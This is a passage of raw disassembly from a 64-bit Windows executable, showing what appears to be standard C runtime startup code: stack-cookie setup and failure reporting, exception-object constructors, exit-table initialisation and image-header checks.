   14000347c:	48 89 05 45 77 01 00 	mov    %rax,0x17745(%rip)        # 0x14001abc8
   140003483:	48 8b 05 9e 77 01 00 	mov    0x1779e(%rip),%rax        # 0x14001ac28
   14000348a:	48 89 05 0f 76 01 00 	mov    %rax,0x1760f(%rip)        # 0x14001aaa0
   140003491:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140003496:	48 89 05 13 77 01 00 	mov    %rax,0x17713(%rip)        # 0x14001abb0
   14000349d:	c7 05 e9 75 01 00 09 	movl   $0xc0000409,0x175e9(%rip)        # 0x14001aa90
   1400034a4:	04 00 c0 
   1400034a7:	c7 05 e3 75 01 00 01 	movl   $0x1,0x175e3(%rip)        # 0x14001aa94
   1400034ae:	00 00 00 
   1400034b1:	c7 05 ed 75 01 00 01 	movl   $0x1,0x175ed(%rip)        # 0x14001aaa8
   1400034b8:	00 00 00 
   1400034bb:	b8 08 00 00 00       	mov    $0x8,%eax
   1400034c0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400034c4:	48 8d 0d e5 75 01 00 	lea    0x175e5(%rip),%rcx        # 0x14001aab0
   1400034cb:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400034d2:	00 
   1400034d3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400034d8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400034dc:	48 8b 0d 1d 6b 01 00 	mov    0x16b1d(%rip),%rcx        # 0x14001a000
   1400034e3:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400034e8:	b8 08 00 00 00       	mov    $0x8,%eax
   1400034ed:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400034f1:	48 8b 0d 10 6b 01 00 	mov    0x16b10(%rip),%rcx        # 0x14001a008
   1400034f8:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400034fd:	48 8d 0d 0c c0 00 00 	lea    0xc00c(%rip),%rcx        # 0x14000f510
   140003504:	e8 ff fe ff ff       	call   0x140003408
   140003509:	48 83 c4 38          	add    $0x38,%rsp
   14000350d:	c3                   	ret
   14000350e:	cc                   	int3
   14000350f:	cc                   	int3
   140003510:	48 83 ec 28          	sub    $0x28,%rsp
   140003514:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003519:	e8 06 00 00 00       	call   0x140003524
   14000351e:	48 83 c4 28          	add    $0x28,%rsp
   140003522:	c3                   	ret
   140003523:	cc                   	int3
   140003524:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140003528:	48 83 ec 28          	sub    $0x28,%rsp
   14000352c:	b9 17 00 00 00       	mov    $0x17,%ecx
   140003531:	ff 15 71 bd 00 00    	call   *0xbd71(%rip)        # 0x14000f2a8
   140003537:	85 c0                	test   %eax,%eax
   140003539:	74 08                	je     0x140003543
   14000353b:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000353f:	8b c8                	mov    %eax,%ecx
   140003541:	cd 29                	int    $0x29
   140003543:	48 8d 0d e6 75 01 00 	lea    0x175e6(%rip),%rcx        # 0x14001ab30
   14000354a:	e8 71 00 00 00       	call   0x1400035c0
   14000354f:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140003554:	48 89 05 cd 76 01 00 	mov    %rax,0x176cd(%rip)        # 0x14001ac28
   14000355b:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   140003560:	48 83 c0 08          	add    $0x8,%rax
   140003564:	48 89 05 5d 76 01 00 	mov    %rax,0x1765d(%rip)        # 0x14001abc8
   14000356b:	48 8b 05 b6 76 01 00 	mov    0x176b6(%rip),%rax        # 0x14001ac28
   140003572:	48 89 05 27 75 01 00 	mov    %rax,0x17527(%rip)        # 0x14001aaa0
   140003579:	c7 05 0d 75 01 00 09 	movl   $0xc0000409,0x1750d(%rip)        # 0x14001aa90
   140003580:	04 00 c0 
   140003583:	c7 05 07 75 01 00 01 	movl   $0x1,0x17507(%rip)        # 0x14001aa94
   14000358a:	00 00 00 
   14000358d:	c7 05 11 75 01 00 01 	movl   $0x1,0x17511(%rip)        # 0x14001aaa8
   140003594:	00 00 00 
   140003597:	b8 08 00 00 00       	mov    $0x8,%eax
   14000359c:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400035a0:	48 8d 0d 09 75 01 00 	lea    0x17509(%rip),%rcx        # 0x14001aab0
   1400035a7:	8b 54 24 30          	mov    0x30(%rsp),%edx
   1400035ab:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1400035af:	48 8d 0d 5a bf 00 00 	lea    0xbf5a(%rip),%rcx        # 0x14000f510
   1400035b6:	e8 4d fe ff ff       	call   0x140003408
   1400035bb:	48 83 c4 28          	add    $0x28,%rsp
   1400035bf:	c3                   	ret
   1400035c0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400035c5:	57                   	push   %rdi
   1400035c6:	48 83 ec 40          	sub    $0x40,%rsp
   1400035ca:	48 8b d9             	mov    %rcx,%rbx
   1400035cd:	ff 15 ad bc 00 00    	call   *0xbcad(%rip)        # 0x14000f280
   1400035d3:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   1400035da:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400035df:	48 8b cf             	mov    %rdi,%rcx
   1400035e2:	45 33 c0             	xor    %r8d,%r8d
   1400035e5:	ff 15 9d bc 00 00    	call   *0xbc9d(%rip)        # 0x14000f288
   1400035eb:	48 85 c0             	test   %rax,%rax
   1400035ee:	74 32                	je     0x140003622
   1400035f0:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400035f6:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400035fb:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   140003600:	4c 8b c8             	mov    %rax,%r9
   140003603:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003608:	4c 8b c7             	mov    %rdi,%r8
   14000360b:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003610:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003615:	33 c9                	xor    %ecx,%ecx
   140003617:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000361c:	ff 15 6e bc 00 00    	call   *0xbc6e(%rip)        # 0x14000f290
   140003622:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140003627:	48 83 c4 40          	add    $0x40,%rsp
   14000362b:	5f                   	pop    %rdi
   14000362c:	c3                   	ret
   14000362d:	cc                   	int3
   14000362e:	cc                   	int3
   14000362f:	cc                   	int3
   140003630:	40 53                	rex push %rbx
   140003632:	56                   	push   %rsi
   140003633:	57                   	push   %rdi
   140003634:	48 83 ec 40          	sub    $0x40,%rsp
   140003638:	48 8b d9             	mov    %rcx,%rbx
   14000363b:	ff 15 3f bc 00 00    	call   *0xbc3f(%rip)        # 0x14000f280
   140003641:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140003648:	33 ff                	xor    %edi,%edi
   14000364a:	45 33 c0             	xor    %r8d,%r8d
   14000364d:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003652:	48 8b ce             	mov    %rsi,%rcx
   140003655:	ff 15 2d bc 00 00    	call   *0xbc2d(%rip)        # 0x14000f288
   14000365b:	48 85 c0             	test   %rax,%rax
   14000365e:	74 39                	je     0x140003699
   140003660:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140003666:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000366b:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140003670:	4c 8b c8             	mov    %rax,%r9
   140003673:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003678:	4c 8b c6             	mov    %rsi,%r8
   14000367b:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140003680:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003685:	33 c9                	xor    %ecx,%ecx
   140003687:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000368c:	ff 15 fe bb 00 00    	call   *0xbbfe(%rip)        # 0x14000f290
   140003692:	ff c7                	inc    %edi
   140003694:	83 ff 02             	cmp    $0x2,%edi
   140003697:	7c b1                	jl     0x14000364a
   140003699:	48 83 c4 40          	add    $0x40,%rsp
   14000369d:	5f                   	pop    %rdi
   14000369e:	5e                   	pop    %rsi
   14000369f:	5b                   	pop    %rbx
   1400036a0:	c3                   	ret
   1400036a1:	cc                   	int3
   1400036a2:	cc                   	int3
   1400036a3:	cc                   	int3
   1400036a4:	e9 1f 30 00 00       	jmp    0x1400066c8
   1400036a9:	cc                   	int3
   1400036aa:	cc                   	int3
   1400036ab:	cc                   	int3
   1400036ac:	40 53                	rex push %rbx
   1400036ae:	48 83 ec 20          	sub    $0x20,%rsp
   1400036b2:	48 8b d9             	mov    %rcx,%rbx
   1400036b5:	48 8b c2             	mov    %rdx,%rax
   1400036b8:	48 8d 0d 69 be 00 00 	lea    0xbe69(%rip),%rcx        # 0x14000f528
   1400036bf:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400036c2:	48 89 0b             	mov    %rcx,(%rbx)
   1400036c5:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400036c9:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400036cd:	0f 11 02             	movups %xmm0,(%rdx)
   1400036d0:	e8 8b 0d 00 00       	call   0x140004460
   1400036d5:	48 8d 05 7c be 00 00 	lea    0xbe7c(%rip),%rax        # 0x14000f558
   1400036dc:	48 89 03             	mov    %rax,(%rbx)
   1400036df:	48 8b c3             	mov    %rbx,%rax
   1400036e2:	48 83 c4 20          	add    $0x20,%rsp
   1400036e6:	5b                   	pop    %rbx
   1400036e7:	c3                   	ret
   1400036e8:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   1400036ed:	48 8d 05 74 be 00 00 	lea    0xbe74(%rip),%rax        # 0x14000f568
   1400036f4:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400036f8:	48 8d 05 59 be 00 00 	lea    0xbe59(%rip),%rax        # 0x14000f558
   1400036ff:	48 89 01             	mov    %rax,(%rcx)
   140003702:	48 8b c1             	mov    %rcx,%rax
   140003705:	c3                   	ret
   140003706:	cc                   	int3
   140003707:	cc                   	int3
   140003708:	40 53                	rex push %rbx
   14000370a:	48 83 ec 20          	sub    $0x20,%rsp
   14000370e:	48 8b d9             	mov    %rcx,%rbx
   140003711:	48 8b c2             	mov    %rdx,%rax
   140003714:	48 8d 0d 0d be 00 00 	lea    0xbe0d(%rip),%rcx        # 0x14000f528
   14000371b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000371e:	48 89 0b             	mov    %rcx,(%rbx)
   140003721:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140003725:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140003729:	0f 11 02             	movups %xmm0,(%rdx)
   14000372c:	e8 2f 0d 00 00       	call   0x140004460
   140003731:	48 8d 05 48 be 00 00 	lea    0xbe48(%rip),%rax        # 0x14000f580
   140003738:	48 89 03             	mov    %rax,(%rbx)
   14000373b:	48 8b c3             	mov    %rbx,%rax
   14000373e:	48 83 c4 20          	add    $0x20,%rsp
   140003742:	5b                   	pop    %rbx
   140003743:	c3                   	ret
   140003744:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   140003749:	48 8d 05 40 be 00 00 	lea    0xbe40(%rip),%rax        # 0x14000f590
   140003750:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140003754:	48 8d 05 25 be 00 00 	lea    0xbe25(%rip),%rax        # 0x14000f580
   14000375b:	48 89 01             	mov    %rax,(%rcx)
   14000375e:	48 8b c1             	mov    %rcx,%rax
   140003761:	c3                   	ret
   140003762:	cc                   	int3
   140003763:	cc                   	int3
   140003764:	40 53                	rex push %rbx
   140003766:	48 83 ec 20          	sub    $0x20,%rsp
   14000376a:	48 8b d9             	mov    %rcx,%rbx
   14000376d:	48 8b c2             	mov    %rdx,%rax
   140003770:	48 8d 0d b1 bd 00 00 	lea    0xbdb1(%rip),%rcx        # 0x14000f528
   140003777:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000377a:	48 89 0b             	mov    %rcx,(%rbx)
   14000377d:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140003781:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140003785:	0f 11 02             	movups %xmm0,(%rdx)
   140003788:	e8 d3 0c 00 00       	call   0x140004460
   14000378d:	48 8b c3             	mov    %rbx,%rax
   140003790:	48 83 c4 20          	add    $0x20,%rsp
   140003794:	5b                   	pop    %rbx
   140003795:	c3                   	ret
   140003796:	cc                   	int3
   140003797:	cc                   	int3
   140003798:	48 8d 05 89 bd 00 00 	lea    0xbd89(%rip),%rax        # 0x14000f528
   14000379f:	48 89 01             	mov    %rax,(%rcx)
   1400037a2:	48 83 c1 08          	add    $0x8,%rcx
   1400037a6:	e9 45 0d 00 00       	jmp    0x1400044f0
   1400037ab:	cc                   	int3
   1400037ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400037b1:	57                   	push   %rdi
   1400037b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400037b6:	48 8d 05 6b bd 00 00 	lea    0xbd6b(%rip),%rax        # 0x14000f528
   1400037bd:	48 8b f9             	mov    %rcx,%rdi
   1400037c0:	48 89 01             	mov    %rax,(%rcx)
   1400037c3:	8b da                	mov    %edx,%ebx
   1400037c5:	48 83 c1 08          	add    $0x8,%rcx
   1400037c9:	e8 22 0d 00 00       	call   0x1400044f0
   1400037ce:	f6 c3 01             	test   $0x1,%bl
   1400037d1:	74 0d                	je     0x1400037e0
   1400037d3:	ba 18 00 00 00       	mov    $0x18,%edx
   1400037d8:	48 8b cf             	mov    %rdi,%rcx
   1400037db:	e8 70 f9 ff ff       	call   0x140003150
   1400037e0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400037e5:	48 8b c7             	mov    %rdi,%rax
   1400037e8:	48 83 c4 20          	add    $0x20,%rsp
   1400037ec:	5f                   	pop    %rdi
   1400037ed:	c3                   	ret
   1400037ee:	cc                   	int3
   1400037ef:	cc                   	int3
   1400037f0:	48 83 ec 48          	sub    $0x48,%rsp
   1400037f4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400037f9:	e8 ea fe ff ff       	call   0x1400036e8
   1400037fe:	48 8d 15 33 4a 01 00 	lea    0x14a33(%rip),%rdx        # 0x140018238
   140003805:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000380a:	e8 09 0d 00 00       	call   0x140004518
   14000380f:	cc                   	int3
   140003810:	48 83 ec 48          	sub    $0x48,%rsp
   140003814:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003819:	e8 26 ff ff ff       	call   0x140003744
   14000381e:	48 8d 15 9b 4a 01 00 	lea    0x14a9b(%rip),%rdx        # 0x1400182c0
   140003825:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000382a:	e8 e9 0c 00 00       	call   0x140004518
   14000382f:	cc                   	int3
   140003830:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   140003835:	48 8d 05 fc bc 00 00 	lea    0xbcfc(%rip),%rax        # 0x14000f538
   14000383c:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   140003841:	c3                   	ret
   140003842:	cc                   	int3
   140003843:	cc                   	int3
   140003844:	48 83 ec 28          	sub    $0x28,%rsp
   140003848:	e8 0f 08 00 00       	call   0x14000405c
   14000384d:	85 c0                	test   %eax,%eax
   14000384f:	74 21                	je     0x140003872
   140003851:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140003858:	00 00 
   14000385a:	48 8b 48 08          	mov    0x8(%rax),%rcx
   14000385e:	eb 05                	jmp    0x140003865
   140003860:	48 3b c8             	cmp    %rax,%rcx
   140003863:	74 14                	je     0x140003879
   140003865:	33 c0                	xor    %eax,%eax
   140003867:	f0 48 0f b1 0d 98 77 	lock cmpxchg %rcx,0x17798(%rip)        # 0x14001b008
   14000386e:	01 00 
   140003870:	75 ee                	jne    0x140003860
   140003872:	32 c0                	xor    %al,%al
   140003874:	48 83 c4 28          	add    $0x28,%rsp
   140003878:	c3                   	ret
   140003879:	b0 01                	mov    $0x1,%al
   14000387b:	eb f7                	jmp    0x140003874
   14000387d:	cc                   	int3
   14000387e:	cc                   	int3
   14000387f:	cc                   	int3
   140003880:	40 53                	rex push %rbx
   140003882:	48 83 ec 20          	sub    $0x20,%rsp
   140003886:	0f b6 05 83 77 01 00 	movzbl 0x17783(%rip),%eax        # 0x14001b010
   14000388d:	85 c9                	test   %ecx,%ecx
   14000388f:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003894:	0f 44 c3             	cmove  %ebx,%eax
   140003897:	88 05 73 77 01 00    	mov    %al,0x17773(%rip)        # 0x14001b010
   14000389d:	e8 0e 06 00 00       	call   0x140003eb0
   1400038a2:	e8 11 0d 00 00       	call   0x1400045b8
   1400038a7:	84 c0                	test   %al,%al
   1400038a9:	75 04                	jne    0x1400038af
   1400038ab:	32 c0                	xor    %al,%al
   1400038ad:	eb 14                	jmp    0x1400038c3
   1400038af:	e8 50 33 00 00       	call   0x140006c04
   1400038b4:	84 c0                	test   %al,%al
   1400038b6:	75 09                	jne    0x1400038c1
   1400038b8:	33 c9                	xor    %ecx,%ecx
   1400038ba:	e8 21 0d 00 00       	call   0x1400045e0
   1400038bf:	eb ea                	jmp    0x1400038ab
   1400038c1:	8a c3                	mov    %bl,%al
   1400038c3:	48 83 c4 20          	add    $0x20,%rsp
   1400038c7:	5b                   	pop    %rbx
   1400038c8:	c3                   	ret
   1400038c9:	cc                   	int3
   1400038ca:	cc                   	int3
   1400038cb:	cc                   	int3
   1400038cc:	40 53                	rex push %rbx
   1400038ce:	48 83 ec 20          	sub    $0x20,%rsp
   1400038d2:	80 3d 38 77 01 00 00 	cmpb   $0x0,0x17738(%rip)        # 0x14001b011
   1400038d9:	8b d9                	mov    %ecx,%ebx
   1400038db:	75 67                	jne    0x140003944
   1400038dd:	83 f9 01             	cmp    $0x1,%ecx
   1400038e0:	77 6a                	ja     0x14000394c
   1400038e2:	e8 75 07 00 00       	call   0x14000405c
   1400038e7:	85 c0                	test   %eax,%eax
   1400038e9:	74 28                	je     0x140003913
   1400038eb:	85 db                	test   %ebx,%ebx
   1400038ed:	75 24                	jne    0x140003913
   1400038ef:	48 8d 0d 22 77 01 00 	lea    0x17722(%rip),%rcx        # 0x14001b018
   1400038f6:	e8 6d 31 00 00       	call   0x140006a68
   1400038fb:	85 c0                	test   %eax,%eax
   1400038fd:	75 10                	jne    0x14000390f
   1400038ff:	48 8d 0d 2a 77 01 00 	lea    0x1772a(%rip),%rcx        # 0x14001b030
   140003906:	e8 5d 31 00 00       	call   0x140006a68
   14000390b:	85 c0                	test   %eax,%eax
   14000390d:	74 2e                	je     0x14000393d
   14000390f:	32 c0                	xor    %al,%al
   140003911:	eb 33                	jmp    0x140003946
   140003913:	66 0f 6f 05 95 bc 00 	movdqa 0xbc95(%rip),%xmm0        # 0x14000f5b0
   14000391a:	00 
   14000391b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000391f:	f3 0f 7f 05 f1 76 01 	movdqu %xmm0,0x176f1(%rip)        # 0x14001b018
   140003926:	00 
   140003927:	48 89 05 fa 76 01 00 	mov    %rax,0x176fa(%rip)        # 0x14001b028
   14000392e:	f3 0f 7f 05 fa 76 01 	movdqu %xmm0,0x176fa(%rip)        # 0x14001b030
   140003935:	00 
   140003936:	48 89 05 03 77 01 00 	mov    %rax,0x17703(%rip)        # 0x14001b040
   14000393d:	c6 05 cd 76 01 00 01 	movb   $0x1,0x176cd(%rip)        # 0x14001b011
   140003944:	b0 01                	mov    $0x1,%al
   140003946:	48 83 c4 20          	add    $0x20,%rsp
   14000394a:	5b                   	pop    %rbx
   14000394b:	c3                   	ret
   14000394c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003951:	e8 66 02 00 00       	call   0x140003bbc
   140003956:	cc                   	int3
   140003957:	cc                   	int3
   140003958:	48 83 ec 18          	sub    $0x18,%rsp
   14000395c:	4c 8b c1             	mov    %rcx,%r8
   14000395f:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140003964:	66 39 05 95 c6 ff ff 	cmp    %ax,-0x396b(%rip)        # 0x140000000
   14000396b:	75 78                	jne    0x1400039e5
   14000396d:	48 63 0d c8 c6 ff ff 	movslq -0x3938(%rip),%rcx        # 0x14000003c
   140003974:	48 8d 15 85 c6 ff ff 	lea    -0x397b(%rip),%rdx        # 0x140000000
   14000397b:	48 03 ca             	add    %rdx,%rcx
   14000397e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140003984:	75 5f                	jne    0x1400039e5
   140003986:	b8 0b 02 00 00       	mov    $0x20b,%eax
   14000398b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   14000398f:	75 54                	jne    0x1400039e5
   140003991:	4c 2b c2             	sub    %rdx,%r8
   140003994:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140003998:	48 8d 51 18          	lea    0x18(%rcx),%rdx
   14000399c:	48 03 d0             	add    %rax,%rdx
   14000399f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400039a3:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400039a7:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   1400039ab:	48 89 14 24          	mov    %rdx,(%rsp)
   1400039af:	49 3b d1             	cmp    %r9,%rdx
   1400039b2:	74 18                	je     0x1400039cc
   1400039b4:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   1400039b7:	4c 3b c1             	cmp    %rcx,%r8
   1400039ba:	72 0a                	jb     0x1400039c6
   1400039bc:	8b 42 08             	mov    0x8(%rdx),%eax
   1400039bf:	03 c1                	add    %ecx,%eax
   1400039c1:	4c 3b c0             	cmp    %rax,%r8
   1400039c4:	72 08                	jb     0x1400039ce
   1400039c6:	48 83 c2 28          	add    $0x28,%rdx
   1400039ca:	eb df                	jmp    0x1400039ab
   1400039cc:	33 d2                	xor    %edx,%edx
   1400039ce:	48 85 d2             	test   %rdx,%rdx
   1400039d1:	75 04                	jne    0x1400039d7
   1400039d3:	32 c0                	xor    %al,%al
   1400039d5:	eb 14                	jmp    0x1400039eb
   1400039d7:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   1400039db:	7d 04                	jge    0x1400039e1
   1400039dd:	32 c0                	xor    %al,%al
   1400039df:	eb 0a                	jmp    0x1400039eb
   1400039e1:	b0 01                	mov    $0x1,%al
   1400039e3:	eb 06                	jmp    0x1400039eb
   1400039e5:	32 c0                	xor    %al,%al
   1400039e7:	eb 02                	jmp    0x1400039eb
   1400039e9:	32 c0                	xor    %al,%al
   1400039eb:	48 83 c4 18          	add    $0x18,%rsp
   1400039ef:	c3                   	ret
   1400039f0:	40 53                	rex push %rbx
   1400039f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400039f6:	8a d9                	mov    %cl,%bl
   1400039f8:	e8 5f 06 00 00       	call   0x14000405c
   1400039fd:	33 d2                	xor    %edx,%edx
   1400039ff:	85 c0                	test   %eax,%eax
   140003a01:	74 0b                	je     0x140003a0e
   140003a03:	84 db                	test   %bl,%bl
   140003a05:	75 07                	jne    0x140003a0e
   140003a07:	48 87 15 fa 75 01 00 	xchg   %rdx,0x175fa(%rip)        # 0x14001b008
   140003a0e:	48 83 c4 20          	add    $0x20,%rsp
   140003a12:	5b                   	pop    %rbx
   140003a13:	c3                   	ret
   140003a14:	40 53                	rex push %rbx
   140003a16:	48 83 ec 20          	sub    $0x20,%rsp
   140003a1a:	80 3d ef 75 01 00 00 	cmpb   $0x0,0x175ef(%rip)        # 0x14001b010
   140003a21:	8a d9                	mov    %cl,%bl
   140003a23:	74 04                	je     0x140003a29
   140003a25:	84 d2                	test   %dl,%dl
   140003a27:	75 0c                	jne    0x140003a35
   140003a29:	e8 ea 31 00 00       	call   0x140006c18
   140003a2e:	8a cb                	mov    %bl,%cl
   140003a30:	e8 ab 0b 00 00       	call   0x1400045e0
   140003a35:	b0 01                	mov    $0x1,%al
   140003a37:	48 83 c4 20          	add    $0x20,%rsp
   140003a3b:	5b                   	pop    %rbx
   140003a3c:	c3                   	ret
   140003a3d:	cc                   	int3
   140003a3e:	cc                   	int3
   140003a3f:	cc                   	int3
   140003a40:	40 53                	rex push %rbx
   140003a42:	48 83 ec 20          	sub    $0x20,%rsp
   140003a46:	48 83 3d ca 75 01 00 	cmpq   $0xffffffffffffffff,0x175ca(%rip)        # 0x14001b018
   140003a4d:	ff 
   140003a4e:	48 8b d9             	mov    %rcx,%rbx
   140003a51:	75 07                	jne    0x140003a5a
   140003a53:	e8 c4 2f 00 00       	call   0x140006a1c
   140003a58:	eb 0f                	jmp    0x140003a69
   140003a5a:	48 8b d3             	mov    %rbx,%rdx
   140003a5d:	48 8d 0d b4 75 01 00 	lea    0x175b4(%rip),%rcx        # 0x14001b018
   140003a64:	e8 27 30 00 00       	call   0x140006a90
   140003a69:	33 d2                	xor    %edx,%edx
   140003a6b:	85 c0                	test   %eax,%eax
   140003a6d:	48 0f 44 d3          	cmove  %rbx,%rdx
   140003a71:	48 8b c2             	mov    %rdx,%rax
   140003a74:	48 83 c4 20          	add    $0x20,%rsp
   140003a78:	5b                   	pop    %rbx
   140003a79:	c3                   	ret
   140003a7a:	cc                   	int3
   140003a7b:	cc                   	int3
   140003a7c:	48 83 ec 28          	sub    $0x28,%rsp
   140003a80:	e8 bb ff ff ff       	call   0x140003a40
   140003a85:	48 f7 d8             	neg    %rax
   140003a88:	1b c0                	sbb    %eax,%eax
   140003a8a:	f7 d8                	neg    %eax
   140003a8c:	ff c8                	dec    %eax
   140003a8e:	48 83 c4 28          	add    $0x28,%rsp
   140003a92:	c3                   	ret
   140003a93:	cc                   	int3
   140003a94:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003a99:	55                   	push   %rbp
   140003a9a:	48 8b ec             	mov    %rsp,%rbp
   140003a9d:	48 83 ec 20          	sub    $0x20,%rsp
   140003aa1:	48 8b 05 58 65 01 00 	mov    0x16558(%rip),%rax        # 0x14001a000
   140003aa8:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140003aaf:	2b 00 00 
   140003ab2:	48 3b c3             	cmp    %rbx,%rax
   140003ab5:	75 74                	jne    0x140003b2b
   140003ab7:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   140003abc:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140003ac0:	ff 15 fa b7 00 00    	call   *0xb7fa(%rip)        # 0x14000f2c0
   140003ac6:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003aca:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140003ace:	ff 15 e4 b7 00 00    	call   *0xb7e4(%rip)        # 0x14000f2b8
   140003ad4:	8b c0                	mov    %eax,%eax
   140003ad6:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140003ada:	ff 15 18 b7 00 00    	call   *0xb718(%rip)        # 0x14000f1f8
   140003ae0:	8b c0                	mov    %eax,%eax
   140003ae2:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140003ae6:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140003aea:	ff 15 c0 b7 00 00    	call   *0xb7c0(%rip)        # 0x14000f2b0
   140003af0:	8b 45 20             	mov    0x20(%rbp),%eax
   140003af3:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140003af7:	48 c1 e0 20          	shl    $0x20,%rax
   140003afb:	48 33 45 20          	xor    0x20(%rbp),%rax
   140003aff:	48 33 45 10          	xor    0x10(%rbp),%rax
   140003b03:	48 33 c1             	xor    %rcx,%rax
   140003b06:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140003b0d:	ff 00 00 
   140003b10:	48 23 c1             	and    %rcx,%rax
   140003b13:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140003b1a:	2b 00 00 
   140003b1d:	48 3b c3             	cmp    %rbx,%rax
   140003b20:	48 0f 44 c1          	cmove  %rcx,%rax
   140003b24:	48 89 05 d5 64 01 00 	mov    %rax,0x164d5(%rip)        # 0x14001a000
   140003b2b:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140003b30:	48 f7 d0             	not    %rax
   140003b33:	48 89 05 ce 64 01 00 	mov    %rax,0x164ce(%rip)        # 0x14001a008
   140003b3a:	48 83 c4 20          	add    $0x20,%rsp
   140003b3e:	5d                   	pop    %rbp
   140003b3f:	c3                   	ret
   140003b40:	33 c0                	xor    %eax,%eax
   140003b42:	c3                   	ret
   140003b43:	cc                   	int3
   140003b44:	b8 01 00 00 00       	mov    $0x1,%eax
   140003b49:	c3                   	ret
   140003b4a:	cc                   	int3
   140003b4b:	cc                   	int3
   140003b4c:	b8 00 40 00 00       	mov    $0x4000,%eax
   140003b51:	c3                   	ret
   140003b52:	cc                   	int3
   140003b53:	cc                   	int3
   140003b54:	48 8d 0d f5 74 01 00 	lea    0x174f5(%rip),%rcx        # 0x14001b050
   140003b5b:	48 ff 25 66 b7 00 00 	rex.W jmp *0xb766(%rip)        # 0x14000f2c8
   140003b62:	cc                   	int3
   140003b63:	cc                   	int3
   140003b64:	b0 01                	mov    $0x1,%al
   140003b66:	c3                   	ret
   140003b67:	cc                   	int3
   140003b68:	c2 00 00             	ret    $0x0
   140003b6b:	cc                   	int3
   140003b6c:	48 8d 05 ed 74 01 00 	lea    0x174ed(%rip),%rax        # 0x14001b060
   140003b73:	c3                   	ret
